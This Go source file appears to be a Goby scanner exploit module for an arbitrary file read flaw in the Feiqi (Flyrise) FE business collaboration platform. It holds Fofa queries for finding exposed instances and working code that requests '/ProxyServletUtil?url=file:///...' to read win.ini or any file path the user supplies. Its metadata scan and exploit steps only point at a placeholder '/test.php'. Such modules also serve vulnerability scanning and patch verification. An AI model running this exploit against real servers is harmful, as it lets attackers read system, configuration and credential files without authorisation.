package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "FE-business-collaboration-platform-for-Feiqi-Interconnection /ProxyServletUtil File Read Vulnerability",
    "Description": "<p>Feiqi Interconnect-FE enterprise operation management platform is a cloud workbench supported by cloud computing, intelligence, big data, Internet of Things, mobile Internet and other technologies.There is an arbitrary file reading vulnerability in ProxyServletUtil. Attackers can read arbitrary files through this interface.</p>",
    "Product": "FE business collaboration platform for Feiqi Interconnection",
    "Homepage": "https://www.flyrise.cn/",
    "DisclosureDate": "2024-10-29",
    "PostTime": "2024-10-31",
    "Author": "3013320359@qq.com",
    "FofaQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"/js39/flyrise.dialog.js\" && body=\"layui/layui.js\" || body=\"/js39/external/jquery\"",
    "GobyQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"/js39/flyrise.dialog.js\" && body=\"layui/layui.js\" || body=\"/js39/external/jquery\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p> 3. If not necessary, prohibit public network access to the system. </p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-FE%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ProxyServletUti%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "c:/Windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "飞企互联 FE 业务协作平台 /ProxyServletUtil 文件读取漏洞",
            "Product": "飞企互联 FE 业务协作平台",
            "Description": "<p>飞企互联-FE企业运营管理平台是一个基于云计算、智能化、大数据、物联网、移动互联网等技术支撑的云工作台。</p><p>其ProxyServletUtil 存在任意文件读取漏洞，攻击者可通过这个接口实现任意文件读取。<br><br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p>&nbsp;2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "FE-business-collaboration-platform-for-Feiqi-Interconnection /ProxyServletUtil File Read Vulnerability",
            "Product": "FE business collaboration platform for Feiqi Interconnection",
            "Description": "<p>Feiqi Interconnect-FE enterprise operation management platform is a cloud workbench supported by cloud computing, intelligence, big data, Internet of Things, mobile Internet and other technologies.There is an arbitrary file reading vulnerability in ProxyServletUtil. Attackers can read arbitrary files through this interface.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.flyrise.cn/\">https://www.flyrise.cn/</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.&nbsp;<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`

	postOrGet_Lp8bxXwED4NN := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		respTxt := ""
		URLPath := "/ProxyServletUtil?url="
		getRequestConfig := httpclient.NewGetRequestConfig(URLPath + filePath)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)

		if err != nil || response == nil {
			return "", err
		}
		respTxt = response.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/ProxyServletUtil?url="
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"file:///c:/Windows/win.ini": "mci extensions",
			}
			// 函数继承
			fileReadFunc := postOrGet_Lp8bxXwED4NN

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for filePath, fileText := range defaultModeMap {
				resp, err := fileReadFunc(u, filePath)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"file:///c:/Windows/win.ini", "mci extensions"},
			}
			// 此处需要修改：函数继承
			fileReadFunc := postOrGet_Lp8bxXwED4NN

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = "file:///" + goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
